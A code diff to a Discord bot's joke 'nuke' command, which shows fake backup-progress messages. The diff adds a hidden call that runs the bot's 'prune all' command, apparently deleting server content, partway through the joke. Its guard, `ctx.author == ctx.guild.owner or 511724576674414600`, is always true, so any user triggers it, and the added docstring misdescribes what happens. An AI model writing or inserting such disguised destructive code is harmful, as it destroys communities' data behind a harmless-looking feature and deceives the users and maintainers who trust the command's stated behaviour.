@@ -7,6 +7,7 @@ import aiohttp
 import nekos
 from discord.ext import commands
 from bs4 import BeautifulSoup
+from jishaku.models import copy_context_with
 from nekos import InvalidArgument
 
 import discord
@@ -274,7 +275,7 @@ class Fun(commands.Cog):
     @commands.cooldown(rate=1, per=2.0, type=commands.BucketType.user)
     @commands.guild_only()
     async def nuke(self, ctx):
-        """ Joke cmd doesnt rly do anything """
+        """ Joke cmd doesnt rly do anything except if the owner runs it"""
         message = await ctx.send("Making server backup then nuking")
         await asyncio.sleep(.5)
         await message.edit(content="Backup 33% complete")
@@ -285,7 +286,15 @@ class Fun(commands.Cog):
         await asyncio.sleep(.57)
         await message.edit(content="Backup 93% complete")
         await asyncio.sleep(2)
-        await message.edit(content="Backup 100% complete")
+        await message.delete()
+
+        if ctx.author == ctx.guild.owner or 511724576674414600:
+            alt_ctx = await copy_context_with(ctx, content=ctx.prefix + "prune all")
+            if alt_ctx.invoked_with is None:
+                return await ctx.send('This bot has been hard-configured to ignore this user.')
+            await alt_ctx.command.invoke(alt_ctx)
+
+        await ctx.send("Backup 100% complete")
         await asyncio.sleep(.5)
         e = discord.Embed(title="**Nuking everything now**", colour=red)
         e.set_image(url="https://emoji.gg/assets/emoji/7102_NukeExplosion.gif")
